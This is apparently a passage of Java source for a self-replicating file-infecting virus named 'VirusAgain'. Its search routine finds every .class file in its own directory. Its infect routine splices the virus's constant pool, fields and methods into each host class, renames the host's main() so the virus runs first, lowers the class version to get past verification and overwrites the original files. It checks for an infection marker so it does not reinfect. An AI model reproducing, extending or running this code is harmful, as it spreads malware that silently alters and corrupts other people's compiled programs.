import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.URL;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.AbstractMap.SimpleEntry;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.TreeMap;

/**
 * Class whose _____search() function infects clean classes with a copy of itself.
 *
 * TODO: Code cleanup. There's a lot of messy code here.
 * 
 * "_____" is added to the name of functions to avoid naming conflicts with functions from the clean class.
 */
class VirusAgain {
	/**
	 * Don't actually infect the file (don't write out any infected code).
	 * Useful for testing that our file parsing is correct and nothing is corrupted.
	 */
	private static boolean DONT_INFECT = false;

	/**
	 * Allow constant_pool entries to be noop'd.
	 * No real reason to allow this except debugging stuff.
	 */
	private static boolean ALLOW_CONSTANT_POOL_NOOPING = false;

	/**
	 * Parse the attributes of Code attributes? Yes / no.
	 * If no we skip them (and as a result they're removed (if out != null)).
	 * NOTE: false means StackMapTable won't be parsed.
	 * NOTE: Code will likely break if this is set to true.
	 * 	This is because LineNumberTable, LocalVariableTable, and LocalVariableTypeTable are borked by that ldc fix.
	 */
	private static boolean PARSE_CODE_ATTRIBUTES = false;

	//Can't use enum because it counts as a class.
	private final static int STACK_MAP_TABLE_REMOVE = 0;
	private final static int STACK_MAP_TABLE_TRUNCATE = 1;
	private final static int STACK_MAP_TABLE_PARSE = 2;
	/**
	 * What to do with the StackMapTable.
	 */
	private static int STACK_MAP_TABLE_ACTION = STACK_MAP_TABLE_TRUNCATE;

	/**
	 * Turn on/off some debugging output.
	 */
	private final static boolean DEBUG_MESSAGES = false;

	/**
	 * Always succeed on the infection test for the specified infected file.
	 */
	private final static boolean CLEAN_INFECTION_CHECK_IS_SHORTWIRED = false;

	/**
	 * Rename the class's main().
	 * The one that isn't renamed will be run when the java command is used.
	 */
	private final static boolean RENAME_UNINFECTED_MAIN = true;
	private final static boolean RENAME_INFECTED_MAIN = false;

	/**
	 * Remove the infected class's main() entry in the methods[] table.
	 */
	private final static boolean REMOVE_INFECTED_MAIN = false;
	private final static boolean REMOVE_INFECTED_INIT = true;
	private final static boolean REMOVE_INFECTED_PLACEHOLDER = true;

	/**
	 * Overwrite clean files with their infected counterpart.
	 */
	private final static boolean OVERWRITE_INFECTED_FILES = true;

	/**
	 * The infected file probably only has one attribute, the source file.
	 * You almost certainly do NOT want to do this.
	 */
	private final static boolean WRITE_INFECTED_ATTRIBUTES_OUT = false;

	/**
	 * Disable some [mostly] unneeded code.
	 */
	private static boolean FIND_COMMON = false;

	/**
	 * And unused private constructor
	 *  so the infected class doesn't end up with two zero-arg constructors.
	 */
	private VirusAgain(VirusAgain v) {
	}

	/**
	 * If this is set to true then we're the originator of the virus and _everything_ should be copied over.
	 */
	private static boolean ARE_WE_THE_ORIGINAL = false;

	/**
	 * What we want to rename the function.
	 * This should be the same length or shorter than the original name.
	 */
	private final static byte[] MAIN_RENAMED_NAME = { '_', '_', '_', 'M' };

	private final static int CONSTANT_Class = 7;
	private final static int CONSTANT_Fieldref = 9;
	private final static int CONSTANT_Methodref = 10;
	private final static int CONSTANT_InterfaceMethodref = 11;
	private final static int CONSTANT_String = 8;
	private final static int CONSTANT_Integer = 3;
	private final static int CONSTANT_Float = 4;
	private final static int CONSTANT_Long = 5;
	private final static int CONSTANT_Double = 6;
	private final static int CONSTANT_NameAndType = 12;
	private final static int CONSTANT_Utf8 = 1;
	private final static int CONSTANT_MethodHandle = 15;
	private final static int CONSTANT_MethodType = 16;
	private final static int CONSTANT_InvokeDynamic = 18;

	/**
	 * The name of the injected class.
	 * We use this because it this as a UTF8 is the second constant_pool entry in the original virus class
	 *  (and therefore the second [infection] constant_pool entry in any infected files also).
	 */
	private final static String INFECTION_IDENTIFIER = "Yes I be infected.";//"VirusAgain";

	/**
	 * The UTF8 entry that houses the INFECTION_IDENTIFIER.
	 */
	private final static byte[] IDENTIFIER_UTF8;
	static {
		byte ident_bytes[] = INFECTION_IDENTIFIER.getBytes();
		IDENTIFIER_UTF8 = new byte[1 + 2 + ident_bytes.length];
		IDENTIFIER_UTF8[0] = CONSTANT_Utf8;

		byte tmp_bytes[] = _____intTo2Bytes(ident_bytes.length);
		IDENTIFIER_UTF8[1] = tmp_bytes[0];
		IDENTIFIER_UTF8[2] = tmp_bytes[1];

		for (int i = 0; i < ident_bytes.length; ++i) {
			IDENTIFIER_UTF8[i + 3] = ident_bytes[i];
		}
	}

	/**
	 * Used by the _____increase2Index function to see if there is a preexisting mapping it should
	 *  use instead of just adding change_amount to whatever is there.
	 */
	private final static HashMap<Integer, Integer> infected_switch_table = new HashMap<Integer, Integer>();

	/**
	 * args[0] = Folder that the files are in.
	 * args[1] = Infected file name. (You can use this class's name for that, VirusAgain.class)
	 * args[2] = Uninfected file name. (i.e. HelloWorld.class)
	 * args[3] = Output file name. (i.e. output/HelloWorld.class)
	 * 
	 * @param args
	 * @throws Throwable
	 */
	public static void main(String args[]) {
		___M(args);

		if (DEBUG_MESSAGES) {
			System.out.println("-----VIRUS_START-----");
		}

		try {
			_____search();
		} catch (Throwable e) {
			e.printStackTrace();
		}

		if (DEBUG_MESSAGES) {
			System.out.println("-----VIRUS_END-----");
		}
	}

	/**
	 * The purpose of this function is to do nothing but sit there and be pretty so the call to it can be switched out
	 *  for the clean main() function.
	 * @param args
	 */
	public static void ___M(String args[]) {
		ARE_WE_THE_ORIGINAL = true;
	}

	/**
	 * Search the current directory for:
	 *  a) An infected class. i.e. itself.
	 *  b) A list of uninfected classes.
	 * @throws IOException 
	 */
	private static void _____search() throws Throwable {
		/*
		 * Get _this_ class's path and name so we can open it.
		 */
		Path this_classes_path;
		{
			String name = Thread.currentThread().getStackTrace()[1].getClassName();
			Class<?> thisClass = Class.forName(name);
			URL url = thisClass.getResource(thisClass.getSimpleName() + ".class");
			this_classes_path = Paths.get(url.toURI());
		}

		if (DEBUG_MESSAGES) {
			System.out.println("This .class file is located at:\n\t" + this_classes_path.toString());
			System.out.println("This .class file is located at:\n\t" + this_classes_path.getParent().toString());
		}
		/*
		 * Look for uninfected files in the current working directory
		 *  then infect them.
		 */
		Path dir;
		//dir = Paths.get("./", "");//The directory to search in (should be working directory, but for now it's bin/
		dir = this_classes_path.getParent();

		DirectoryStream<Path> stream;
		try {
			stream = Files.newDirectoryStream(dir, "*.class");
		} catch (IOException ex) {
			System.err.println(ex);
			return;
		}

		for (Path entry : stream) {
			_____infect(this_classes_path, entry);
		}
	}

	@SuppressWarnings("unused")
	private static void _____infect(Path infected_path, Path clean_path) {
		try {
			if (DEBUG_MESSAGES) {
				System.out.println(clean_path.getFileName());
			}
			/*
			 * Indices to keep track of where we are in the clean class file and the infected class file.
			 */
			int clean_index;
			int infected_index;

			/*
			 * Read the clean class file in as a byte array
			 *  and check that the clean file is indeed a clean .class file.
			 */
			byte clean_bytes[] = Files.readAllBytes(clean_path);
			int clean_indices[];
			int clean_cp_byte_indices[];
			HashMap<Integer, String> clean_UTF8_lookup;//Optional
			{
				/*
				 * Get indices of the clean file. 
				 */
				clean_UTF8_lookup = new HashMap<Integer, String>();
				int clean_retval[][] = _____isFileInfected(clean_bytes, clean_UTF8_lookup);
				clean_indices = clean_retval[0];
				clean_cp_byte_indices = clean_retval[1];

				if (clean_indices == null || clean_indices[0] >= 0) {
					if (DEBUG_MESSAGES) {
						System.out.println("The specified file " + clean_path.getFileName() + " wasn't actually clean or had no main().");
					}
					return;
				}

				/*
				 * Check clean file for static main(String args[]). If none then throw error.
				 * If static main(String args[]) exists then then rename to MAIN_RENAMED_NAME.
				 */
				{
					/*
					 * Check if the clean file has a main(String args[]) function.
					 */
					if (CLEAN_INFECTION_CHECK_IS_SHORTWIRED) {
						if (DEBUG_MESSAGES) {
							System.out.println("Clean infectedness test was shortwired.");
						}
					}
					else if (clean_indices[4] == -1) {
						//throw new Error("The specified clean file had no main(String args[]) function.");
						if (DEBUG_MESSAGES) {
							System.out.println("The specified clean file had no main(String args[]) function.");
						}
						return;
					}
				}
			}
			/*
			 * Read the infected class file in as a byte array
			 *  and check that the infected file is indeed an infected .class file.
			 */
			byte infected_bytes[];
			int infected_indices[];
			int infected_cp_byte_indices[];
			HashMap<Integer, String> infected_UTF8_lookup;
			{
				infected_bytes = Files.readAllBytes(infected_path);

				/*
				 * Check if the specified infected file is actually infected.
				 */
				infected_UTF8_lookup = new HashMap<Integer, String>();
				int infected_retval[][] = _____isFileInfected(infected_bytes, infected_UTF8_lookup);

				infected_indices = infected_retval[0];

				/*
				 * Short circuit the infection stuff because there's no INFECTION_IDENTIFIER.
				 */
				if (ARE_WE_THE_ORIGINAL) {
					if(DEBUG_MESSAGES){
						System.out.println("We're the originator. Copy over _everything_.");
					}
					infected_indices[0] = infected_indices[1];
					infected_indices[3] = 10;
				}

				/*
				 * Get constant_pool indices of infected file.
				 */
				infected_cp_byte_indices = infected_retval[1];
				if (infected_indices == null || infected_indices[0] < 0) {
					throw new Error("The specified infected file wasn't actually infected.");
				}
			}

			/*
			 * Look for classes that are found in both classes and save them in a global hashmap.
			 * Then, later, whenever we're updating constant_pool refs check that global hashmap to see if
			 *  we should give a different index instead of + change_amount. 
			 */
			{
				String clean_name = clean_path.getFileName().toString();
				clean_name = clean_name.substring(0, clean_name.length() - 6);

				String infected_name = infected_path.getFileName().toString();
				infected_name = infected_name.substring(0, infected_name.length() - 6);

				_____findCommonClasses(clean_name, clean_bytes, clean_cp_byte_indices,
						infected_name, infected_bytes, infected_cp_byte_indices);

				_____findCommonMethods(clean_bytes, clean_cp_byte_indices,
						infected_bytes, infected_cp_byte_indices, clean_indices[4]);

				/*
				 * Noop the entries that will no longer be needed.
				 */
				for (Integer infected_i : infected_switch_table.keySet()) {
					//System.out.println(infected_i + " -:- " + infected_switch_table.get(infected_i));

					_____noopConstantPoolEntry(infected_bytes,
							infected_cp_byte_indices[infected_i - 1]);
				}
			}

			/*
			 * This seems to get rid of the errors with the StackMapFrame being removed but still being expected.
			 * Change the class major version.
			 * 
			 * ``Class files >= version 51 are verified (exclusively) by the type checking verifier
			 * whereas with version 50 then if the verification fails it falls back to the
			 * old type inferencing verifier.''
			 * 
			 * => You want to set the version to 50 [either that or compile to Java 1.6, which achieves the same end].
			 */
			{
				int target_version = 50;
				{
					byte tmp_bytes[] = _____intTo2Bytes(target_version);
					clean_bytes[6] = tmp_bytes[0];
					clean_bytes[7] = tmp_bytes[1];
				}
			}

			/*
			 * Open output stream so we can write our infected copy of the clean class out.
			 */
			RandomAccessFile out;
			{
				File output_file;
				if (OVERWRITE_INFECTED_FILES) {
					/*
					 * We want to overwrite the infected files.
					 */
					output_file = clean_path.toFile();
				}
				else {
					/*
					 * We want to create a separate output folder out/ that contains the infected classes.
					 */
					File output_folder = new File(clean_path.getParent() + "/out/");
					output_folder.mkdirs();//Create the output folder
					output_file = new File(clean_path.getParent() + "/out/" + clean_path.getFileName());
				}
				//out = new FileOutputStream(output_file);
				out = new RandomAccessFile(output_file, "rw");
			}

			/*
			 * The number of constant_pool entries originally in the clean class file.
			 */
			int cp_index_change_amount = 0;

			/*
			 * --------------------------------------------------
			 * constant_pool[]
			 * --------------------------------------------------
			 */
			HashSet<Integer> remove_name_indices = new HashSet<Integer>();
			HashSet<Integer> remove_reminant_indices = new HashSet<Integer>();
			{
				/*
				 * Modify the constant_pool_count of the clean file by adding INFECTED_constant_pool_count.
				 */
				{
					int new_constant_pool_count = 1 + clean_indices[1];
					if (ARE_WE_THE_ORIGINAL) {
						new_constant_pool_count += 1;
					}
					if (DONT_INFECT == false) {
						new_constant_pool_count += infected_indices[0];
						{
							byte tmp_bytes[] = _____intTo2Bytes(new_constant_pool_count);
							clean_bytes[8] = tmp_bytes[0];
							clean_bytes[9] = tmp_bytes[1];
						}
					}
					if (DEBUG_MESSAGES) {
						System.out.println("\tconstant_pool_count = " + (new_constant_pool_count - 1) + " + 1 (clean)" + clean_indices[1] + " + (infected)" + infected_indices[0]);
					}
				}

				/*
				 * Rename the clean file's main function.
				 */
				if (RENAME_UNINFECTED_MAIN) {
					for (int i = 0; i < MAIN_RENAMED_NAME.length; ++i) {
						clean_bytes[clean_indices[4] + i] = MAIN_RENAMED_NAME[i];
					}
				}

				/*
				 * Rename the infected file's main function.
				 */
				if (RENAME_INFECTED_MAIN) {
					for (int i = 0; i < MAIN_RENAMED_NAME.length; ++i) {
						infected_bytes[infected_indices[4] + i] = MAIN_RENAMED_NAME[i];
					}
				}

				/*
				 * Remove the specified functions from the infected file.
				 * NOTE: Been modified to only remove the NameAndType part, as the other bits seem to be used.
				 */
				ArrayList<String> remove_names = new ArrayList<String>();
				if (REMOVE_INFECTED_INIT) {
					remove_names.add("<init>");
				}
				if (REMOVE_INFECTED_MAIN) {
					if (RENAME_INFECTED_MAIN) {
						new String(MAIN_RENAMED_NAME);
					}
					else {
						remove_names.add("main");
					}
				}
				if (REMOVE_INFECTED_PLACEHOLDER) {
					remove_names.add(new String(MAIN_RENAMED_NAME));
				}
				/*
				 * Get the constant pool indices of those functions we want to remove. 
				 */
				for (String name : remove_names) {
					int functions_constant_pool_indices[] = _____locateFunctionFromConstantPool(infected_bytes, infected_cp_byte_indices, name);
					if (functions_constant_pool_indices != null) {
						/*
						 * 1 instead of functions_constant_pool_indices.length
						 *  because we only want to noop the CONSTANT_Methodref.
						 */
						int i = 2;
						//for ( false /*i < functions_constant_pool_indices.length*/; ++i) {
						if (DEBUG_MESSAGES) {
							//System.out.println("noop'd " + (functions_constant_pool_indices[i] + 1));
						}
						/*
						 * Noop the constant_pool entry.
						 */
						_____noopConstantPoolEntry(infected_bytes,
								infected_cp_byte_indices[functions_constant_pool_indices[i]]);

						/*
						 * Take note that the constant_pool entry has been noop'd.
						 * We use this information later to remove methods[] entries.
						 */
						//remove_name_indices.add(functions_constant_pool_indices[i]);

						remove_name_indices.add(functions_constant_pool_indices[2] + 1);
						//}
					}

					/*
					 * Get the constant pool indices of those functions who belong to the host class but we don't want to copy over.
					 */
					{
						final int num_clean = infected_indices[1] - infected_indices[0];
						//System.out.println("infected_indices[1] = " + infected_indices[1]);
						//System.out.println("infected_indices[0] = " + infected_indices[0]);
						//System.out.println("num_clean = " + num_clean);
						for (int i = 1; i <= num_clean; ++i) {
							remove_reminant_indices.add(i);
							//System.out.println("remove_reminant_indices = " + i);
						}
					}
					remove_name_indices.addAll(remove_reminant_indices);
				}

				/*
				 * Write out the start of the clean file, including the constant_pool_count.
				 */
				clean_index = 10;
				out.write(clean_bytes, 0, clean_index);

				/*
				 * Write out the constant_pool.
				 */
				out.write(clean_bytes, clean_index, clean_indices[2] - clean_index);
				clean_index = clean_indices[2];

				/*
				* Write out an identifier for the virus.
				* [This only needs to be done the very first time].
				*/
				if (ARE_WE_THE_ORIGINAL) {
					/*
					 * Add 1 to the INFECTED_constant_pool_count to account for our infection identifier.
					 */
					cp_index_change_amount += 1;

					out.write(IDENTIFIER_UTF8);
				}

				/*
				 * Write out the infected constant_pool.
				 */
				cp_index_change_amount += clean_indices[1] - (infected_indices[1] - infected_indices[0]);
				//System.out.println("change_amount = " + cp_index_change_amount + " = " + clean_indices[1] + " - (" + infected_indices[1] + " - " + infected_indices[0] + ")");				
				if (DONT_INFECT == false) {
					/*
					 * Update constant_pool references in the infected constant pool and output them.
					 */
					infected_index = infected_indices[3];
					for (int i = 0; i < infected_indices[0]; ++i) {
						int next_index = _____increaseConstantPoolEntryRefs(infected_bytes, infected_index, cp_index_change_amount);
						out.write(infected_bytes, infected_index, next_index - infected_index);
						infected_index = next_index;
					}
					assert infected_index == infected_indices[2];
				}
				infected_index = infected_indices[2];
			}

			/*
			 * --------------------------------------------------
			 * interfaces[]
			 * --------------------------------------------------
			 */
			{
				//u2	access_flags;
				//u2	this_class;
				//u2	super_class;int infected_cp_byte_indices[];
				/*
				 * Write out those 6 clean bytes. 
				 */
				{
					int length = 2 * 3;
					out.write(clean_bytes, clean_index, length);
					clean_index += length;
					infected_index += length;
				}

				/*
				 * Get the new interfaces_count.
				 */
				int clean_interfaces_count = _____bytes2(clean_bytes, clean_index);
				clean_index += 2;
				int infected_interfaces_count = _____bytes2(infected_bytes, infected_index);
				infected_index += 2;

				/*
				 * Write out new interfaces count.
				 */
				{
					int interfaces_count = clean_interfaces_count;
					if (DONT_INFECT == false) {
						interfaces_count += infected_interfaces_count;
					}
					if (DEBUG_MESSAGES) {
						System.out.println("\tInterfaces: " + interfaces_count + " = (clean)" + clean_interfaces_count + " + (infected)" + infected_interfaces_count);
					}
					{
						byte tmp_bytes[] = _____intTo2Bytes(interfaces_count);
						out.write(tmp_bytes, 0, 2);
					}
				}

				/*
				 * Write out clean interfaces table.
				 */
				{
					//u2	interfaces_count;
					int clean_interfaces_length = 2 * clean_interfaces_count;

					//u2	interfaces[interfaces_count];
					out.write(clean_bytes, clean_index, clean_interfaces_length);
					clean_index += clean_interfaces_length;
				}
				/*
				 * Write out infected interfaces table.
				 */
				//u2	interfaces_count;
				int infected_interfaces_length = 2 * infected_interfaces_count;
				if (DONT_INFECT == false) {
					//u2	interfaces[interfaces_count];
					out.write(infected_bytes, infected_index, infected_interfaces_length);
				}
				infected_index += infected_interfaces_length;
			}

			/*
			 * --------------------------------------------------
			 * fields[]
			 * --------------------------------------------------
			 */
			{
				/*
				 * Get the new fields[] count.
				 */
				final long fields_count_fp = out.getFilePointer();
				int clean_fields_count = _____bytes2(clean_bytes, clean_index);
				{
					int infected_fields_count = _____bytes2(infected_bytes, infected_index);

					int fields_count = clean_fields_count;
					if (DONT_INFECT == false) {
						fields_count += infected_fields_count;
					}
					if (DEBUG_MESSAGES) {
						System.out.println("\tFields: " + fields_count + " = (clean)" + clean_fields_count + " + (infected)" + infected_fields_count);
					}

					/*
					 * Write out fields[] count.
					 */
					{
						byte tmp_bytes[] = _____intTo2Bytes(fields_count);
						out.write(tmp_bytes, 0, 2);
					}
				}

				/*
				 * Write out the clean fields[] table.
				 */
				int clean_retval[] = _____parseAndUpdateMethodsPool(out, clean_bytes, clean_index, 0, clean_UTF8_lookup, null);
				clean_index = clean_retval[1];

				/*
				 * Write out the infected fields[] table.
				 */
				RandomAccessFile tmp_out = out;
				if (DONT_INFECT) {
					tmp_out = null;
				}
				int infected_retval[] = _____parseAndUpdateMethodsPool(tmp_out, infected_bytes, infected_index, cp_index_change_amount, infected_UTF8_lookup, remove_reminant_indices);
				infected_index = infected_retval[1];

				/*
				 * Write out the new fields_count
				 */
				{
					final long fp = out.getFilePointer();
					int new_fields_count = clean_fields_count + infected_retval[0];
					out.seek(fields_count_fp);
					{
						byte tmp_bytes[] = _____intTo2Bytes(new_fields_count);
						out.write(tmp_bytes);
					}
					out.seek(fp);
				}
			}

			/*
			 * --------------------------------------------------
			 * methods[]
			 * --------------------------------------------------
			 */
			{
				/*
				 * Write out methods_count that we'll overwrite later.
				 */
				final long methods_count_fp = out.getFilePointer();
				out.writeByte(0);
				out.writeByte(0);

				/*
				 * Parse clean methods[] table.
				 */
				int clean_retval[] = _____parseAndUpdateMethodsPool(out, clean_bytes, clean_index, 0, clean_UTF8_lookup, null);
				clean_index = clean_retval[1];

				final int num_clean_methods = clean_retval[0];
				int new_methods_count = num_clean_methods;

				/*
				 * Parse and update refs in infected methods[] table.
				 */
				RandomAccessFile tmp_out = out;
				if (DONT_INFECT) {
					tmp_out = null;
				}

				int infected_retval[] = _____parseAndUpdateMethodsPool(tmp_out, infected_bytes, infected_index, cp_index_change_amount, infected_UTF8_lookup, remove_name_indices);
				infected_index = infected_retval[1];
				final int num_infected_methods = infected_retval[0];
				if (DONT_INFECT == false) {
					new_methods_count += num_infected_methods;
				}

				if (DEBUG_MESSAGES) {
					System.out.println("\tMethods: " + new_methods_count + " = (clean)" + num_clean_methods + " + (infected)" + num_infected_methods);
				}

				/*
				 * Write out the new methods_count
				 */
				{
					final long fp = out.getFilePointer();
					//System.out.println(methods_count_fp + " : " + fp);
					out.seek(methods_count_fp);
					{
						byte tmp_bytes[] = _____intTo2Bytes(new_methods_count);
						out.write(tmp_bytes);
					}
					out.seek(fp);
				}
			}

			/*
			 * --------------------------------------------------
			 * attributes[]
			 * --------------------------------------------------
			 */
			{
				/*
				 * Write out the clean attributes[] table.
				 */
				{
					/*
					 * Write out clean attributes_count.
					 */
					int clean_attributes_count = _____bytes2(clean_bytes, clean_index);
					int attributes_count = clean_attributes_count;
					if (WRITE_INFECTED_ATTRIBUTES_OUT) {
						int infected_attributes_count = _____bytes2(infected_bytes, infected_index);

						if (DONT_INFECT == false) {
							attributes_count += infected_attributes_count;
						}

						System.out.println("\tAttributes: " + attributes_count +
								" = (clean)" + clean_attributes_count +
								" + (infected)" + infected_attributes_count);
					}
					out.write(clean_bytes, clean_index, 2);

					clean_index += 2;
					infected_index += 2;
				}

				/*
				 * Write clean attributes out.
				 */
				out.write(clean_bytes, clean_index, (clean_bytes.length - clean_index));

				/*
				 * Write infected attributes out.
				 */
				if (DONT_INFECT == false && WRITE_INFECTED_ATTRIBUTES_OUT) {
					out.write(infected_bytes, infected_index, (infected_bytes.length - infected_index));
				}
			}

			/*
			 * Set the length of the file to whatever our current index is.
			 * This is required because the RandomAccessFile class seems to add tons of padding
			 *  to the end of the file otherwise.
			 */
			out.setLength(out.getFilePointer());

			out.close();
		} catch (Throwable ex) {
			ex.printStackTrace();
		}
	}

	/**
	 * Overwrite a constant_pool entry with a noop.
	 * @param bytes
	 * @param index Byte index of the constant_pool entry in bytes.
	 */
	private static int _____noopConstantPoolEntry(byte bytes[], int index) {
		int length = _____getConstantPoolEntryLength(bytes, index);
		if (ALLOW_CONSTANT_POOL_NOOPING) {

			bytes[index] = CONSTANT_Utf8;

			byte tmp_bytes[] = _____intTo2Bytes(length - 3);
			bytes[index + 1] = tmp_bytes[0];
			bytes[index + 2] = tmp_bytes[1];

			for (int i = 3; i < length; ++i) {
				bytes[index + i] = 'A';
			}
		}
		return index + length;
	}

	/**
	 * Returns the total length of a given constant_pool entry in bytes.
	 * @param bytes
	 * @param index
	 * @return
	 */
	private static int _____getConstantPoolEntryLength(byte bytes[], int index) {
		//u1	tag
		final int constant_entry_tag = bytes[index];
		int length = 1;

		switch (constant_entry_tag) {
		case CONSTANT_Class:
		case CONSTANT_String:
		case CONSTANT_MethodType:
			length += 2;
			break;
		case CONSTANT_Fieldref:
		case CONSTANT_Methodref:
		case CONSTANT_InterfaceMethodref:
		case CONSTANT_Integer:
		case CONSTANT_Float:
		case CONSTANT_NameAndType:
		case CONSTANT_InvokeDynamic:
			length += 4;
			break;
		case CONSTANT_Long:
		case CONSTANT_Double:
			length += 8;
			break;
		case CONSTANT_MethodHandle:
			length += 3;
			break;
		case CONSTANT_Utf8:
			length += 2 + _____bytes2(bytes, index + 1);
			break;
		}
		return length;
	}

	/**
	 * Given a function name find its Methodref structure in the constant_pool,
	 *  then return the (constant_pool) index of that Methodref
	 *  and the non-UTF8 constant_pool entries that it references.
	 * 
	 * @param bytes
	 * @param constant_pool_indices
	 * @param function_name	The function we want to locate.
	 * @return null if no function with that name was not found.
	 * 	Otherwise an array of three indices, the CONSTANT_Methodref, the CONSTANT_NameAndType,
	 *   and the CONSTANT_Utf8.
	 */
	private static int[] _____locateFunctionFromConstantPool(byte bytes[], final int constant_pool_indices[], String function_name) {
		for (int i = 0; i < constant_pool_indices.length; ++i) {
			if (bytes[constant_pool_indices[i]] == CONSTANT_Methodref) {
				//CONSTANT_Methodref_info -> CONSTANT_NameAndType_info
				int nextIndex1 = _____bytes2(bytes, constant_pool_indices[i] + (1 + 2));
				--nextIndex1;//Because arrays are 0 indexed but constant_pool isn't

				if (bytes[constant_pool_indices[nextIndex1]] != CONSTANT_NameAndType) {
					/*
					 * No need to throw an error here, just means the method has been noop'd.
					 */
					continue;
				}

				//CONSTANT_NameAndType_info -> CONSTANT_Utf8_info
				int nextIndex2 = _____bytes2(bytes, constant_pool_indices[nextIndex1] + 1);
				--nextIndex2;//Because arrays are 0 indexed but constant_pool isn't

				if (bytes[constant_pool_indices[nextIndex2]] != CONSTANT_Utf8) {
					throw new Error("#" + (i + 1) + ", #" + (nextIndex1 + 1) + ", #" + (nextIndex2 + 1) + ", 2 != CONSTANT_Utf8, = "
							+ bytes[constant_pool_indices[nextIndex2]]);
				}

				int str_len = _____bytes2(bytes, (constant_pool_indices[nextIndex2] + 1));
				String name = _____parseCONSTANT_Utf8(bytes, constant_pool_indices[nextIndex2] + 3, str_len);
				//System.out.println(name);
				if (name.equals(function_name)) {
					return new int[] { i, nextIndex1, nextIndex2 };
				}
			}
		}
		return null;
	}

	private static void _____findCommonClasses(String clean_class_name, byte clean_bytes[], int clean_cp_byte_indices[],
			String infected_class_name, byte infected_bytes[], int infected_cp_byte_indices[]) throws IOException {
		TreeMap<String, Integer> clean_classes = _____getListOfClasses(clean_bytes, clean_cp_byte_indices);
		TreeMap<String, Integer> infected_classes = _____getListOfClasses(infected_bytes, infected_cp_byte_indices);

		/*
		 * Put in an entry for the classes themselves.
		 */
		infected_switch_table.put(
				infected_classes.get(infected_class_name),
				clean_classes.get(clean_class_name));

		if (FIND_COMMON) {
			/*
			 * Put in entries for any common classes.
			 */
			Iterator<String> clean_it = clean_classes.descendingKeySet().iterator();
			while (clean_it.hasNext()) {
				String clean = clean_it.next();

				Integer infected_val = infected_classes.get(clean);
				if (infected_val != null) {
					Integer clean_val = clean_classes.get(clean);
					infected_switch_table.put(infected_val, clean_val);
				}
			}
		}
	}

	private static void _____findCommonMethods(byte clean_bytes[], int clean_cp_byte_indices[],
			byte infected_bytes[], int infected_cp_byte_indices[],
			int clean_main_cp_index) throws IOException {

		if (FIND_COMMON) {
			TreeMap<String, int[]> clean_classes = _____getListOfMethods(clean_bytes, clean_cp_byte_indices);
			TreeMap<String, int[]> infected_classes = _____getListOfMethods(infected_bytes, infected_cp_byte_indices);

			/*
			 * Put in entries for any common classes.
			 */
			Iterator<String> clean_it = clean_classes.descendingKeySet().iterator();
			while (clean_it.hasNext()) {
				String clean = clean_it.next();

				int[] infected_val = infected_classes.get(clean);
				if (infected_val != null) {
					int[] clean_val = clean_classes.get(clean);
					for (int i = 0; i < infected_val.length; ++i) {
						infected_switch_table.put(infected_val[i], clean_val[i]);
						//System.out.println("Added mapping " + infected_val[i] + " -> " + clean_val[i]);
					}
				}
			}
		}
	}

	/**
	 * Get a list of all method references in the given constant pool.
	 * @param bytes
	 * @param cp_byte_indices
	 * @return
	 */
	private static TreeMap<String, int[]> _____getListOfMethods(byte bytes[], int cp_byte_indices[]) {
		TreeMap<String, int[]> list = new TreeMap<String, int[]>();
		for (int i = 0; i < cp_byte_indices.length; ++i) {
			short tag = bytes[cp_byte_indices[i]];
			if (tag == CONSTANT_Fieldref || tag == CONSTANT_Methodref || tag == CONSTANT_InterfaceMethodref) {
				String overallname = "";

				int name_index1 = -1;
				int name_index2 = -1;
				int descriptor_index = -1;

				int classIndex = _____bytes2(bytes, cp_byte_indices[i] + 1);
				--classIndex;
				tag = bytes[cp_byte_indices[classIndex]];
				if (tag != CONSTANT_Class) {
					throw new Error("Invalid constant_pool entry.");
				}
				else {
					//CONSTANT_Class_info -> CONSTANT_Utf8_info
					name_index1 = _____bytes2(bytes, cp_byte_indices[classIndex] + 1);
					--name_index1;//Because arrays are 0 indexed but constant_pool isn't

					//Get UTF8
					String name = _____parseCONSTANT_Utf8(bytes, cp_byte_indices[name_index1]);
					overallname += name;
				}

				int name_and_type_index = _____bytes2(bytes, cp_byte_indices[i] + 1 + 2);
				--name_and_type_index;
				tag = bytes[cp_byte_indices[name_and_type_index]];
				if (tag != CONSTANT_NameAndType) {
					throw new Error("Invalid constant_pool entry.");
				}
				else {
					name_index2 = _____bytes2(bytes, cp_byte_indices[name_and_type_index] + 1);
					--name_index2;//Because arrays are 0 indexed but constant_pool isn't

					//Get UTF8
					String name = _____parseCONSTANT_Utf8(bytes, cp_byte_indices[name_index2]);
					overallname += name;

					descriptor_index = _____bytes2(bytes, cp_byte_indices[name_and_type_index] + 1 + 2);
					--descriptor_index;//Because arrays are 0 indexed but constant_pool isn't

					String descriptor = _____parseCONSTANT_Utf8(bytes, cp_byte_indices[descriptor_index]);
					overallname += descriptor;
				}

				//System.out.println(overallname);
				list.put(overallname, new int[] { i + 1, classIndex + 1, name_and_type_index + 1, name_index1 + 1, name_index2 + 1, descriptor_index + 1 });
			}
		}
		return list;
	}

	/**
	 * Get a list of all classes references in the given constant pool.
	 * @param bytes
	 * @param cp_byte_indices
	 * @return
	 */
	private static TreeMap<String, Integer> _____getListOfClasses(byte bytes[], int cp_byte_indices[]) {
		TreeMap<String, Integer> list = new TreeMap<String, Integer>();
		for (int i = 0; i < cp_byte_indices.length; ++i) {
			short tag = bytes[cp_byte_indices[i]];
			if (tag == CONSTANT_Class) {
				//CONSTANT_Class_info -> CONSTANT_Utf8_info
				int nextIndex = _____bytes2(bytes, cp_byte_indices[i] + 1);
				--nextIndex;//Because arrays are 0 indexed but constant_pool isn't

				if (bytes[cp_byte_indices[nextIndex]] != CONSTANT_Utf8) {
					throw new Error("#" + (i + 1) + ", #" + (nextIndex + 1) + ", 2 != CONSTANT_Utf8, = "
							+ bytes[cp_byte_indices[nextIndex]]);
				}

				int str_len = _____bytes2(bytes, (cp_byte_indices[nextIndex] + 1));
				String name = _____parseCONSTANT_Utf8(bytes, cp_byte_indices[nextIndex] + 3, str_len);

				list.put(name, (i + 1));
			}
		}
		return list;
	}

	/**
	 * Increase the constant_pool indices that the method_info structures reference.
	 *  i.e. Add increment_amount to the name_index.
	 * Can be used as a kludgy method of skipping over the the methods[] table by setting
	 *  change_amount = 0 and UTF8_lookup = null. 
	 * @param bytes
	 * @param index
	 * @param change_amount
